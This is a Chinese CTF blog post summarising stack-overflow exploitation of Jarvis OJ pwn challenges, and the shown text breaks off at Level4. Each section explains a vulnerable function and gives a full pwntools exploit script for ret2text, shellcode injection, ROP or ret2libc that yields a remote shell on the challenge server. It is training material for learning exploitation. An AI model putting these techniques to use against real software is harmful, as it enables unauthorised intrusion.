
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>栈溢出总结 - hackpwn</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="hackpwn,"> 
    <meta name="description" content="本文将会持续更新Jarvisoj-Level0
 发现开启了nx保护 


可以看到程序为64位的ELF文件，使用IDA进行分析。

发现vulnerable函数，跟进。
123456ssize_t,"> 
    <meta name="author" content="dh、Catsay"> 
    <link rel="alternative" href="atom.xml" title="hackpwn" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <link rel="stylesheet" href="/css/diaspora.css">
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
</head>

<body class="loading">
    <span id="config-title" style="display:none">hackpwn</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;" target="_blank" rel="noopener" data-url="http://hackpwn.xyz"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle">栈溢出总结</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" target="_blank" rel="noopener" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;" target="_blank" rel="noopener"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">栈溢出总结</h1>
        <div class="stuff">
            <span>十一月 14, 2019</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF-Pwn/" rel="tag">CTF,Pwn</a></li></ul>


        </div>
        <div class="content markdown">
            <h3 id="本文将会持续更新"><a href="#本文将会持续更新" class="headerlink" title="本文将会持续更新"></a>本文将会持续更新</h3><h3 id="Jarvisoj-Level0"><a href="#Jarvisoj-Level0" class="headerlink" title="Jarvisoj-Level0"></a>Jarvisoj-Level0</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114124203683.png" alt="image-20191114124203683"></p>
<p> 发现开启了nx保护 </p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114123920365.png" alt="image-20191114123920365"></p>
<ul>
<li><p>可以看到程序为64位的ELF文件，使用IDA进行分析。</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114124043024.png" alt="image-20191114124043024"></p>
<p>发现<code>vulnerable</code>函数，跟进。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序开辟了<code>0x80</code>大小的栈空间。但是<code>read</code>了<code>0x200</code>字节，造成栈溢出</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114124335506.png" alt="image-20191114124335506"></p>
<p>同时在函数里发现了<code>callsystem</code>的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目思路很清晰，也就是我们需要把<code>vulnerable_function</code>函数的返回地址覆盖为<code>callsystem</code>函数的地址。</p>
<p>我们就可以构造出payload：<code>&#39;a&#39;*0x80+junk_ebp+p64(sys_addr)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line">e = ELF(<span class="string">"level0.b9ded3801d6dd36a97468e128b81a65d"</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">'callsystem'</span>]</span><br><span class="line">junk_ebp = <span class="string">'a'</span>*<span class="number">8</span><span class="comment">#ebp在64位下8位</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + junk_ebp + p64(sys_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()<span class="comment">#反弹shell进行交互</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114125053896.png" alt="image-20191114125053896"></p>
</li>
</ul>
<h3 id="Jarvisoj-Level1"><a href="#Jarvisoj-Level1" class="headerlink" title="Jarvisoj-Level1"></a>Jarvisoj-Level1</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114125221603.png" alt="image-20191114125221603"></p>
<p>没有开启任何的保护</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114125306156.png" alt="image-20191114125306156"></p>
<p>发现是32位的程序。</p>
<p>进入程序，发现了<code>vulnerable_function</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序会打印出<code>buf</code>的地址，栈的大小为<code>0x88</code>但是<code>read</code>函数缺读了<code>0x100</code>的大小，可以通过栈溢出让函数跳转到<code>shellcode</code>的位置去执行。</p>
<p>Pwntools构造shellcode：<code>shellcode=asm(shellcraft.sh())</code>。</p>
<p>我们可以直接在缓冲区里面构造一个shellcode，并使用<code>buf</code>作为起始地址。</p>
<p>首先我们先要获取到这个地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">text = r.recvline()</span><br><span class="line"><span class="keyword">print</span>  text</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">catsay@Catsay-PC:/mnt/d/CTF/Study/Pwn/Jarvisoj/level1$ python exp.py</span><br><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">What's this:0xfff242c0?</span><br><span class="line"></span><br><span class="line">[*] Closed connection to pwn2.jarvisoj.com port 9877</span><br></pre></td></tr></table></figure>

<p>我们需要获取到<code>fff242c0</code></p>
<p><code>r.recvuntil(&quot;What&#39;s this:&quot;)</code>表示从接收到“what’s this：”开始 </p>
<p><code>buf_addr = int(target.recv(10),16)</code>将获取到的十个字符串转换为16进制的整数</p>
<p>那么可以构造出exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">text = r.recvline()[<span class="number">14</span>: <span class="number">-2</span>]</span><br><span class="line">buf_addr = int(text, <span class="number">16</span>)</span><br><span class="line"><span class="comment">#shellcode放入buf后，buf并未填满，需要继续覆盖到ebp，所以继续向后填充后再返回buf进行执行</span></span><br><span class="line">payload = shellcode +<span class="string">"A"</span> *(<span class="number">0x88</span>+<span class="number">0x4</span>-len(shellcode)) + p32(buf_addr) </span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114130556760.png" alt="image-20191114130556760"></p>
<h3 id="Jarvisoj-Level2"><a href="#Jarvisoj-Level2" class="headerlink" title="Jarvisoj-Level2"></a>Jarvisoj-Level2</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114130809712.png" alt="image-20191114130809712"></p>
<p>开启了NX保护</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114130835189.png" alt="image-20191114130835189"></p>
<p>32为的程序</p>
<p>进入<code>vulnerable_function</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131021031.png" alt="image-20191114131021031"></p>
<p>查看字符串发现了<code>/bin/sh</code>的地址。并且存在<code>system</code>函数，那么的话我们可以直接跳过去执行。获取<code>shell</code>。</p>
<p><code>payload = junk + fackebp + func + junk + 参数</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">system_add = p32(<span class="number">0x08048320</span>)</span><br><span class="line">binsh_add = p32(<span class="number">0x0804A024</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span> + <span class="number">0x4</span>) + system_add +<span class="string">'a'</span>*<span class="number">4</span> + binsh_add</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>因为<code>system()</code>函数需要先传一个地址，这里我们直接随意传，然后跟上<code>/bin/sh</code></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131420145.png" alt="image-20191114131420145"></p>
<h3 id="Jarvisoj-Level2-x64"><a href="#Jarvisoj-Level2-x64" class="headerlink" title="Jarvisoj-Level2_x64"></a>Jarvisoj-Level2_x64</h3><p>很明显题目是64位的。</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131620663.png" alt="image-20191114131620663"></p>
<p>题目依然只是开启了NX保护。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>vulnerable_function</code>同样也是一样的。</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114131739301.png" alt="image-20191114131739301"></p>
<p>也就是说就是题目没有变，只是换成了64位。</p>
<p>首先 read() 函数存在缓冲区溢出漏洞。 64位程序 , 函数调用时参数并不是像 32位程序那样全部存放在栈中，而是：</p>
<p>如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 : <code>rdi, rsi, rdx, rcx, r8, r9</code></p>
<p>如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈，我们这里需要构造 <code>system(&quot;/bin/sh&quot;)</code>的调用栈，因此需要使用到寄存器传参 , 根据<code>rop</code>的思想 :需要首先在可执行程序(或者该程序的动态连接库)中寻找 <code>pop rdi; ret</code> 这两条汇编指令的机器码<code>ROPgadget --binary level2_x64.04d700633c6dc26afc6a1e7e9df8c94e  --only &#39;pop|ret&#39; | grep &#39;rdi&#39;</code></p>
<p><code>0x00000000004006b3 : pop rdi ; ret</code></p>
<p>然后就可以构造 payload：</p>
<p><code>payload =  junk + fake + pop_rdi_ret_address + bin_sh_address + system_address</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9882</span>)</span><br><span class="line">pop_rdi_ret_address = p64(<span class="number">0x4006b3</span>)</span><br><span class="line">bin_sh_address = p64(<span class="number">0x600A90</span>)</span><br><span class="line">system_address = p64(<span class="number">0x4004C0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x80</span> + <span class="string">"B"</span> * <span class="number">0x8</span> + pop_rdi_ret_address + bin_sh_address + system_address</span><br><span class="line">p.write(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191114132704913.png" alt="image-20191114132704913"></p>
<h3 id="Jarvisoj-Level3"><a href="#Jarvisoj-Level3" class="headerlink" title="Jarvisoj-Level3"></a>Jarvisoj-Level3</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116114508069.png" alt="image-20191116114508069"></p>
<p>开启了NX保护，在ida中找到<code>vulnerable_function</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在字符串中没有找到<code>/bin/sh</code>和<code>system</code>等字符串信息。</p>
<p>首先看到 vulnerable_function() 函数中的 <code>read()</code>函数可以溢出，也就是说我们可以任意控制程序的流程 , 构造已知函数地址的所有函数调用栈，这样就可以使用<code>vulnerable_function()</code>中的<code>write()</code>函数将<code>got</code>表中的某一个函数地址打印出来</p>
<p>在<code>libc</code>库中可以看到一些敏感的信息。</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116115045954.png" alt="image-20191116115045954"></p>
<p>然后配合题目提供的 libc 文件计算 system() 函数的地址以及 <code>&quot;/bin/sh&quot;</code> 的地址，最后利用<code>vulnerable_function()</code>函数中的 read() 函数，继续溢出构造 <code>system(&quot;/bin/sh&quot;)</code>的调用栈成功得到 shell</p>
<p>关于<code>libc</code>啰嗦一下：</p>
<p>首先，有一类函数，我们称之为库函数，他们已经编译在了libc库中，供需要时调用（有些类似于Windows动态链接库）。</p>
<p>libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。</p>
<p>程序开始运行时，会把整个libc映射到内存中，此后在程序调用相关库函数时，会依据plt-got表的机制，将所需的库函数加载到内存空间的某个虚拟内存地址，然后调用时就会通过plt_got表辗转跳至真正的函数内存地址处完成功能</p>
<p><code>PLT：内部函数表</code></p>
<p><code>GOT：全局函数表</code></p>
<p><code>完整调用链：Call-&gt;PLT-&gt;GOT-&gt;Real_RVA</code></p>
<p><strong>GOT表和PLT表:</strong></p>
<blockquote>
<p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p>
</blockquote>
<p><strong>延迟绑定:</strong></p>
<blockquote>
<p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p>
</blockquote>
<table>
<thead>
<tr>
<th>stack</th>
</tr>
</thead>
<tbody><tr>
<td>write</td>
</tr>
<tr>
<td>vul_func</td>
</tr>
<tr>
<td>1</td>
</tr>
<tr>
<td>write_got</td>
</tr>
<tr>
<td>4</td>
</tr>
</tbody></table>
<p> 使用write函数需要有三个参数，就是<code>ssize_t write(int fd,const void *buf,size_t nbytes)</code></p>
<p><code>fd = 1</code> 的时候是使用标准输入</p>
<p> 因为需要构造<code>write</code>来使得 <code>write</code>的真实地址泄漏<br>所以 我们使用<code>write</code>的三个参数为<code>1  got_write len(got_write)=4</code> </p>
<p>这样子就可以泄露出<code>write</code>的真实地址，并且还能够在运行一次<code>vul_func</code>函数 ，然后调用<code>system</code>函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"></span><br><span class="line"><span class="comment">#conn=process('./level3')</span></span><br><span class="line">conn=remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9879"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">e=ELF(<span class="string">'./level3'</span>)</span><br><span class="line">vulfun_addr=<span class="number">0x0804844B</span>  </span><br><span class="line">write_plt=e.plt[<span class="string">'write'</span>] </span><br><span class="line">write_got=e.got[<span class="string">'write'</span>] </span><br><span class="line">payload1=<span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">"BBBB"</span>+p32(write_plt)+p32(vulfun_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)<span class="comment">#泄露出write的地址</span></span><br><span class="line">conn.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">conn.sendline(payload1)</span><br><span class="line">write_addr=u32(conn.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#calculate the system_address in memory</span></span><br><span class="line">libc_write=libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_system=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_sh=libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_addr=write_addr-libc_write+libc_system </span><br><span class="line">sh_addr=write_addr-libc_write+libc_sh</span><br><span class="line">payload2=<span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">"BBBB"</span>+p32(system_addr)+<span class="string">"dead"</span>+p32(sh_addr)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116143829094.png" alt="image-20191116143829094"></p>
<h3 id="Jarvisoj-Level3-x64"><a href="#Jarvisoj-Level3-x64" class="headerlink" title="Jarvisoj-Level3_x64"></a>Jarvisoj-Level3_x64</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116144634445.png" alt="image-20191116144634445"></p>
<p>题目的其他地方都一样，只是换成了64位，那么我们就需要使用到<code>ROP</code>了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9883</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">pop_edi_ret = <span class="number">0x00000000004006b3</span><span class="comment">#pop rdi ; ret</span></span><br><span class="line">pop_esi_ret = <span class="number">0x00000000004006b1</span><span class="comment">#pop rsi ; pop r15 ; ret</span></span><br><span class="line">write_plt = <span class="number">0x00000000004004B0</span> </span><br><span class="line">read_got = <span class="number">0x0000000000600A60</span></span><br><span class="line">vul_func = <span class="number">0x00000000004005E6</span></span><br><span class="line">shellcode  = <span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'bbbbbbbb'</span></span><br><span class="line">shellcode += p64(pop_edi_ret)+p64(<span class="number">1</span>)	<span class="comment">#mov edi, 1</span></span><br><span class="line">shellcode += p64(pop_esi_ret)+p64(read_got)+p64(<span class="number">0</span>) <span class="comment">#mov esi, got_read</span></span><br><span class="line">shellcode += p64(write_plt)+p64(vul_func) <span class="comment"># write and return to function  </span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">tmp = p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">addr_read = u64(tmp[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'read_got ='</span>,hex(addr_read)</span><br><span class="line">libc_binsh = <span class="number">0x0000000000180543</span></span><br><span class="line">addr_system = libc.symbols[<span class="string">'system'</span>]- libc.symbols[<span class="string">'read'</span>] + addr_read</span><br><span class="line">addr_binsh =  libc_binsh            - libc.symbols[<span class="string">'read'</span>] + addr_read</span><br><span class="line">addr_exit =   libc.symbols[<span class="string">'exit'</span>]  - libc.symbols[<span class="string">'read'</span>] + addr_read</span><br><span class="line">payload  = <span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'bbbbbbbb'</span></span><br><span class="line">payload += p64(pop_edi_ret)+p64(addr_binsh)		<span class="comment"># mov edi, addr_binsh</span></span><br><span class="line">payload += p64(addr_system)+p64(addr_exit)      <span class="comment"># do system and exit</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116145908294.png" alt="image-20191116145908294"></p>
<h3 id="Jarvisoj-Level4"><a href="#Jarvisoj-Level4" class="headerlink" title="Jarvisoj-Level4"></a>Jarvisoj-Level4</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116150049652.png" alt="image-20191116150049652"></p>
<p>开启了NX保护，32位程序</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116150136489.png" alt="image-20191116150136489"></p>
<p>同样还是<code>read</code>函数溢出，但是这次没有给<code>libc</code>库，so我们可以看一下这个文章：<code>https://www.anquanke.com/post/id/85129</code></p>
<p> DynELF的基本的使用模版是这样的 </p>
